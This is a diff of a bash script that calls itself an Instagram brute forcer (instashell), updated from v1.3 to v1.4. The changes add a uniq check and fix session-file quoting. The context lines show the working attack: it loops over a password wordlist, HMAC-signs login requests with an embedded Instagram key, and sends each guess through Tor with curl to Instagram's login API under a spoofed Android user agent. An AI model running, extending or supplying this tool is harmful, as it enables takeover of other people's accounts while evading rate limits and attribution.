@@ -19,7 +19,8 @@ command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not instal
 command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
 command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
 command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
-command -v cut > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
+command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
+command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
 if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
 echo "/dev/urandom not found!"
 exit 1
@@ -38,7 +39,7 @@ printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |    
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[45m       Instagram Brute Forcer v1.3 Author: github.com/thelinuxchoice\e[0m\n"
+printf "\e[1;77m\e[45m       Instagram Brute Forcer v1.4 Author: github.com/thelinuxchoice\e[0m\n"
 printf "\n"
 }
 
@@ -79,9 +80,7 @@ read -p $'\e[1;77m? [Y/n]: \e[0m' session
 session="${session:-${default_session}}"
 if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
 
-printf "user=%s\npass=%s\nwl_pass=%s\n" $user $pass $wl_pass > store.session.$user.$(date +"%FT%H%M")
-#printf "pass=%s\n" $pass >> store.session
-#printf "wl_pass=%s\n" $wl_pass >> store.session
+printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > store.session.$user.$(date +"%FT%H%M")
 printf "\e[1;77mSession saved.\e[0m\n"
 printf "\e[1;92mUse ./instashell --resume\n"
 else
@@ -176,8 +175,9 @@ checktor
 counter=1
 printf "\e[1;92mFiles sessions:\n\e[0m"
 for list in $(ls store.session*); do
+IFS=$'\n'
 source $list
-printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" $counter $list $wl_pass $pass
+printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
 let counter++
 done
 read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
@@ -197,7 +197,6 @@ ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
-#printf "\e[1;77mTrying pass\e[0m: %s\n" $pass
 check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)
 
 if [[ "$check" == "200" ]]; then
